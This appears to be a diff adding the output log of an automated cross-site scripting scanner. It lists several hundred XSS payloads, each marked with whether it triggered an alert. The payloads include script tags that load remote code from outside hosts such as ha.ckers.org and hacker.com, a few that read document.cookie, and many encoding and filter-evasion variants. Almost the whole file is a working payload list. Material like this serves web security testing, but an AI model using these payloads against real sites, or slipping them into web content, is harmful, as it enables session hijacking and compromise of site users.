@@ -1,0 +1,344 @@
+Payload: <meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi | Alert: False
+Payload: <meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&> | Alert: False
+Payload: <vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe> | Alert: False
+Payload: <x style="behavior:url(%(sct)s)"> | Alert: False
+Payload: <xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label> | Alert: False
+Payload: <script src=%(jscript)s></script> | Alert: False
+Payload: <script language='javascript' src='%(jscript)s'></script> | Alert: False
+Payload: <SCRIPT SRC=%(jscript)s?<B> | Alert: False
+Payload: <SCRIPT/SRC="%(jscript)s"></SCRIPT> | Alert: False
+Payload: <iframe src=%(scriptlet)s < | Alert: False
+Payload: <LAYER SRC="%(scriptlet)s"></LAYER> | Alert: False
+Payload: <STYLE>@import'%(css)s';</STYLE> | Alert: False
+Payload: <XSS STYLE="behavior: url(%(htc)s);"> | Alert: False
+Payload: <OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT> | Alert: False
+Payload: <SCRIPT SRC="%(jpg)s"></SCRIPT> | Alert: False
+Payload: <STYLE>@import'%(css)s';</STYLE> | Alert: False
+Payload: <embed code=%(scriptlet)s></embed> | Alert: False
+Payload: <embed src=%(jscript)s></embed> | Alert: False
+Payload: <embed type="image" src=%(scriptlet)s></embed> | Alert: False
+Payload: ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; | Alert: False
+Payload: alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//-- | Alert: False
+Payload: '';!--"<XSS>=&{()} | Alert: False
+Payload: <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> | Alert: False
+Payload: <IMG SRC="jav ascript:alert('XSS');"> | Alert: False
+Payload: <IMG SRC="jav&#x09;ascript:alert('XSS');"> | Alert: False
+Payload: <IMG SRC="jav&#x0A;ascript:alert('XSS');"> | Alert: False
+Payload: <IMG SRC="jav&#x0D;ascript:alert('XSS');"> | Alert: False
+Payload: perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out | Alert: False
+Payload: <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT> | Alert: False
+Payload: <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")> | Alert: False
+Payload: <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT> | Alert: False
+Payload: <<SCRIPT>alert("XSS");//<</SCRIPT> | Alert: True
+Payload: <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > | Alert: False
+Payload: </textarea>'"><script>alert(document.cookie)</script> | Alert: True
+Payload: '""><script language="JavaScript"> alert('X \nS \nS');</script> | Alert: True
+Payload: '>"><script src = 'http://www.site.com/XSS.js'></script> | Alert: False
+Payload: <script+src=">"+src="http://yoursite.com/xss.js?69,69"></script> | Alert: False
+Payload: src="http://www.site.com/XSS.js"></script> | Alert: False
+Payload: data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4= | Alert: False
+Payload: http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS?? | Alert: False
+Payload: http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS?? | Alert: False
+Payload: '); alert('xss'); var x=' | Alert: False
+Payload: \\'); alert(\'xss\');var x=\' | Alert: False
+Payload: //--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); | Alert: False
+Payload: >"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt> | Alert: False
+Payload: <img src="Mario Heiderich says that svg SHOULD not be executed trough image tags" onerror="javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');"></img> | Alert: True
+Payload: </body> | Alert: False
+Payload: </html> | Alert: False
+Payload: <BODY ONLOAD=alert("XSS")> | Alert: True
+Payload: <IFRAME SRC=”http://hacker-site.com/xss.html”> | Alert: False
+Payload: <DIV STYLE="width: expression(alert('XSS'));"> | Alert: False
+Payload: <OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html"> | Alert: False
+Payload: <EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always"> | Alert: False
+Payload: &apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; | Alert: False
+Payload: &apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()} | Alert: False
+Payload: &lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt; | Alert: False
+Payload: &lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt; | Alert: False
+Payload: Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser | Alert: False
+Payload: exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;); | Alert: False
+Payload: &lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt; | Alert: False
+Payload: &lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt; | Alert: False
+Payload: &lt;IMG SRC=&quot;livescript:[code]&quot;&gt; | Alert: False
+Payload: %BCscript%BEalert(%A2XSS%A2)%BC/script%BE | Alert: False
+Payload: &lt;IMG SRC=&quot;mocha:[code]&quot;&gt; | Alert: False
+Payload: &lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt; | Alert: False
+Payload: &lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt; | Alert: False
+Payload: &lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt; | Alert: False
+Payload: &lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt; | Alert: False
+Payload: &lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt; | Alert: False
+Payload: &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt; | Alert: False
+Payload: &lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt; | Alert: False
+Payload: &lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt; | Alert: False
+Payload: &lt;HTML xmlns:xss&gt; | Alert: False
+Payload: &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt; | Alert: False
+Payload: &lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt; | Alert: False
+Payload: &lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt; | Alert: False
+Payload: &lt;HTML&gt;&lt;BODY&gt; | Alert: False
+Payload: &lt;!--[if gte IE 4]&gt; | Alert: False
+Payload: &lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt; | Alert: False
+Payload: &lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt; | Alert: False
+Payload: &lt;? echo(&apos;&lt;SCR)&apos;; | Alert: False
+Payload: &lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt; | Alert: False
+Payload: &lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt; | Alert: False
+Payload: &lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt; | Alert: False
+Payload: \&quot;;alert(&apos;XSS&apos;);// | Alert: False
+Payload: &lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt; | Alert: False
+Payload: &lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt; | Alert: False
+Payload: &lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D; | Alert: False
+Payload: perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out | Alert: False
+Payload: perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out | Alert: False
+Payload: &lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; | Alert: False
+Payload: &lt;SCRIPT SRC=http://ha.ckers.org/xss.js | Alert: False
+Payload: &lt;SCRIPT SRC=//ha.ckers.org/.j&gt; | Alert: False
+Payload: &lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt; | Alert: False
+Payload: &lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt; | Alert: False
+Payload: &lt;SCRIPT&gt;a=/XSS/ | Alert: False
+Payload: &lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: &lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt; | Alert: False
+Payload: <img SRC="jav ascript:document.vulnerable=true;"> | Alert: False
+Payload: <body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;> | Alert: False
+Payload: <script <B>document.vulnerable=true;</script> | Alert: False
+Payload: \";document.vulnerable=true;;// | Alert: False
+Payload: <body ONLOAD=document.vulnerable=true;> | Alert: False
+Payload: <br SIZE="&{document.vulnerable=true}"> | Alert: False
+Payload: <img SRC='vbscript:document.vulnerable=true;'> | Alert: False
+Payload: 1script3document.vulnerable=true;1/script3 | Alert: False
+Payload: <div STYLE="width: expression(document.vulnerable=true);"> | Alert: False
+Payload: <style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style> | Alert: False
+Payload: <img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)"> | Alert: False
+Payload: <XSS STYLE="xss:expression(document.vulnerable=true)"> | Alert: False
+Payload: exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'> | Alert: False
+Payload: <style TYPE="text/javascript">document.vulnerable=true;</style> | Alert: False
+Payload: <XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span> | Alert: False
+Payload: <XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span> | Alert: False
+Payload: <html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html> | Alert: False
+Payload: <? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?> | Alert: False
+Payload: <a href="javascript#document.vulnerable=true;"> | Alert: False
+Payload: &{document.vulnerable=true;}; | Alert: False
+Payload: <img src=&{document.vulnerable=true;};> | Alert: False
+Payload: <iframe src="vbscript:document.vulnerable=true;"> | Alert: False
+Payload: <img src="mocha:document.vulnerable=true;"> | Alert: False
+Payload: <img src="livescript:document.vulnerable=true;"> | Alert: False
+Payload: <div style="behaviour: url([link to code]);"> | Alert: False
+Payload: <div style="binding: url([link to code]);"> | Alert: False
+Payload: <div style="width: expression(document.vulnerable=true;);"> | Alert: False
+Payload: <style type="text/javascript">document.vulnerable=true;</style> | Alert: False
+Payload: <div datafld="b" dataformatas="html" datasrc="#X"></div> | Alert: False
+Payload: [\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script> | Alert: False
+Payload: <style>@import'http://www.securitycompass.com/xss.css';</style> | Alert: False
+Payload: <style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style> | Alert: False
+Payload: <OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object> | Alert: False
+Payload: <HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html> | Alert: False
+Payload: <script SRC="http://www.securitycompass.com/xss.jpg"></script> | Alert: False
+Payload: <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"--> | Alert: False
+Payload: <script a=">" SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script =">" SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script a=`>` SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script> | Alert: False
+Payload: <div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla] | Alert: False
+Payload: &quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; | Alert: False
+Payload: &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; | Alert: False
+Payload: &lt;/br style=a:expression(alert())&gt; | Alert: False
+Payload: &lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt; | Alert: False
+Payload: &lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt; | Alert: False
+Payload: perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out | Alert: False
+Payload: perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out | Alert: False
+Payload: <~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: <~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: <~/XSS STYLE=xss:expression(alert('XSS'))> | Alert: False
+Payload: </XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: XSS STYLE=xss:e/**/xpression(alert('XSS'))> | Alert: False
+Payload: </XSS STYLE=xss:expression(alert('XSS'))> | Alert: False
+Payload: ';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>; | Alert: False
+Payload: ';';;!--";<;XSS>;=&;{()} | Alert: False
+Payload: <;SCRIPT>;alert(';XSS';)<;/SCRIPT>; | Alert: False
+Payload: <;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>; | Alert: False
+Payload: <;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>; | Alert: False
+Payload: <;BODY ONLOAD=alert(';XSS';)>; | Alert: False
+Payload: <;DIV STYLE=";width: expression(alert(';XSS';));";>; | Alert: False
+Payload: <;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>; | Alert: False
+Payload: Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser | Alert: False
+Payload: exp/*<;XSS STYLE=';no\xss:noxss(";*//*";); | Alert: False
+Payload: <;IMG SRC=';vbscript:msgbox(";XSS";)';>; | Alert: False
+Payload: <;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>; | Alert: False
+Payload: <;IMG SRC=";livescript:[code]";>; | Alert: False
+Payload: %BCscript%BEalert(%A2XSS%A2)%BC/script%BE | Alert: False
+Payload: <;IMG SRC=";mocha:[code]";>; | Alert: False
+Payload: <;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>; | Alert: False
+Payload: <;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>; | Alert: False
+Payload: <;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>; | Alert: False
+Payload: <;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";>; | Alert: False
+Payload: <;XSS STYLE=";xss:expression(alert(';XSS';))";>; | Alert: False
+Payload: <;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>; | Alert: False
+Payload: <;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>; | Alert: False
+Payload: <;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>; | Alert: False
+Payload: <;HTML xmlns:xss>; | Alert: False
+Payload: <;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(';XSS';);";>;]]>; | Alert: False
+Payload: <;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>; | Alert: False
+Payload: <;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>; | Alert: False
+Payload: <;HTML>;<;BODY>; | Alert: False
+Payload: <;!--[if gte IE 4]>; | Alert: False
+Payload: <;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>; | Alert: False
+Payload: <;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>; | Alert: False
+Payload: <;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->; | Alert: False
+Payload: <;? echo(';<;SCR)';; | Alert: False
+Payload: <;BR SIZE=";&;{alert(';XSS';)}";>; | Alert: False
+Payload: <;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>; | Alert: False
+Payload: <;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>; | Alert: False
+Payload: <;DIV STYLE=";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029";>; | Alert: False
+Payload: <;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>; | Alert: False
+Payload: \";;alert(';XSS';);// | Alert: False
+Payload: <;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>; | Alert: False
+Payload: <;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>; | Alert: False
+Payload: <;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>; | Alert: False
